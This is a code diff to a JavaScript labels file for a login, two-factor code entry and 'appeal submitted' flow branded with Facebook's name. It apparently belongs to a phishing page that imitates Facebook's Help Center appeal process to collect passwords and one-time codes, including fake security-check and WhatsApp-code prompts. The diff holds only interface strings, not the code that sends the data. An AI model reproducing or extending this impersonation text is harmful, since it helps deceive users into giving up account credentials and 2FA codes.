@@ -68,25 +68,21 @@ export const defaultLabels = {
     loginBtn: 'Log In',
     cancelBtn: 'Cancel',
 
-    // SecurityCheckModal
-    securityTitle: 'Security Check',
-    securityWarning: 'Please complete the following security check.',
-    securityContinueDesc: 'A security check is required to continue.',
-    securityText1: 'This helps us to combat harmful conduct, detect and prevent spam, and maintain the integrity of our Products.',
-    securityText2: "We've used Google's reCAPTCHA Enterprise product to provide this security check. Your use of reCAPTCHA Enterprise is subject to Google's Privacy Policy and Terms of Use.",
-    securityText3: 'reCAPTCHA Enterprise collects hardware and software information, such as device and application data, and sends it to Google to provide, maintain and improve reCAPTCHA Enterprise and for general security purposes. This information is not used by Google for personalised advertising.',
-    securityWhySeeing: 'Why am I seeing this?',
-    securityNotViolate: 'If you think this content does not violate our Community Standards, please let us know.',
-    securitySubmitBtn: 'Submit',
-
     // TwoFactorCodeModal
     twoFaTitle: 'Confirm your email address or phone number',
+    twoFaTitleNew: 'Two-factor authentication required',
+    twoFaDescriptionTemplate:
+        'Enter the code for this account that we send to {{email}}, {{phone}} or simply confirm through the application of two factors that you have set (such as Duo Mobile or Google Authenticator)',
+    twoFABrandFacebook: 'Facebook',
+    twoFAFallbackUser: 'User',
+    twoFAAuthenticationImageAlt: 'authentication',
+    twoFaContinueBtn: 'Continue',
     twoFaDescAuthenticator: 'Enter the code from your authenticator app (Google Authenticator, Duo Mobile).',
     twoFaDescWhatsApp: 'For security purposes, we have sent a code to your WhatsApp number',
     twoFaDesc: 'For security purposes, we have sent a code to',
     twoFaCodePrompt: 'Please enter the most recent code you received in the box below:',
     twoFaCodeLabel: 'Enter code',
-    twoFaCodePlaceholder: 'Enter confirmation code',
+    twoFaCodePlaceholder: 'Enter the code',
     twoFaNote: 'Note that we will only receive the content you submit when you enter this code successfully.',
     twoFaTryOther: 'Try another way',
     twoFaConfirm: 'Confirm',
@@ -98,11 +94,18 @@ export const defaultLabels = {
     // TryOtherMethodModal
     tryOtherTitle: 'Choose another way to receive the verification code',
     tryOtherAuthenticator: 'Authenticator App',
-    tryOtherWhatsApp: 'WHATSAPP',
+    tryOtherWhatsApp: 'WhatsApp',
     tryOtherWhatsAppSend: 'We will send a code to number',
     tryOtherWhatsAppDefault: 'We will send a code via WhatsApp',
     tryOtherBack: 'Go back',
     tryOtherContinue: 'Continue',
+
+    // SuccessModal
+    successTitle: 'Your appeal has been submitted',
+    successSubtitle: 'Thank you for submitting your appeal.',
+    successDesc: 'Our support team will review your case carefully. You will receive a response within 24–48 hours.',
+    successNote: 'Please do not submit duplicate requests, as this may delay processing.',
+    successBackBtn: 'Back to Help Center',
 
     // HelpCenterFooter
     footerLangText: 'English',
